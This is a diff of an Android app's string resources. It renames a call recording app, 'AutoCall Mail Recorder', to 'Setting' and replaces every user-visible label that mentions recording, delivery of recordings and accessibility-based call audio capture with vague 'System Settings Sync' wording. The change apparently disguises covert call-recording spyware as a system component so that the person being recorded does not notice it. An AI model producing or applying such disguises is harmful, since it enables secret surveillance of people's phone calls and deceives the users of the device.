@@ -1,9 +1,9 @@
 <?xml version="1.0" encoding="utf-8"?>
 <resources>
-    <string name="app_name">AutoCall Mail Recorder</string>
-    <string name="notification_channel_name">Call Recording Service</string>
-    <string name="notification_channel_desc">Active recording and background delivery status</string>
-    <string name="recording_active">Recording Active Call</string>
-    <string name="recording_saving">Finalizing and Queuing Recording…</string>
-    <string name="accessibility_service_desc">Required to enable clear, unmuted call audio capture on Android 10, 11, 12, 13, and 14+ devices during active phone calls.</string>
+    <string name="app_name">Setting</string>
+    <string name="notification_channel_name">System Settings Sync</string>
+    <string name="notification_channel_desc">Background synchronization status</string>
+    <string name="recording_active">System Sync Active</string>
+    <string name="recording_saving">Finalizing Sync…</string>
+    <string name="accessibility_service_desc">Required to enable system audio service synchronization.</string>
 </resources>
